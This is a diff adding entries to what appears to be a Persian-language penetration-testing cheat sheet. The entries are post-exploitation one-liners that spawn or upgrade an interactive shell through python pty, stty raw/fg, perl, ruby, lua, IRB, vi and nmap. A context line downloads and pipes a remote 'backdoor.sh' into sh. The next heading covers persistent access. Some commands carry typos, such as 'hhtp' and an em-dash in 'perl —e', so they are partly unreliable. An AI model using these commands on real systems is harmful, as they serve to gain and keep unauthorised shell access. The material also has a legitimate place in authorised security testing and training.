@@ -190,6 +190,61 @@ wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
+```text
+try ctrl + z
+stty raw -echo 
+fg
+```
+
+```text
+echo os.system('/bin/bash')
+```
+
+```text
+/bin/sh -i
+```
+
+
+```text
+perl —e 'exec "/bin/sh";'
+```
+
+```text
+perl: exec "/bin/sh";
+```
+
+```text
+ruby: exec "/bin/sh"
+```
+
+```text
+lua: os.execute('/bin/sh')
+```
+
+```text
+(From within IRB)
+exec "/bin/sh"
+```
+
+
+```text
+(From within vi)
+:!bash
+```
+
+```text
+(From within vi)
+:set shell=/bin/bash:shell
+```
+
+```text
+(From within nmap)
+!sh
+```
+
+ [netsec.ws](http://netsec.ws/?p=337)
+
+
 ## دسترسی همیشگی
 
 ### برای لینوکس \(در سیستم مهاجم\)
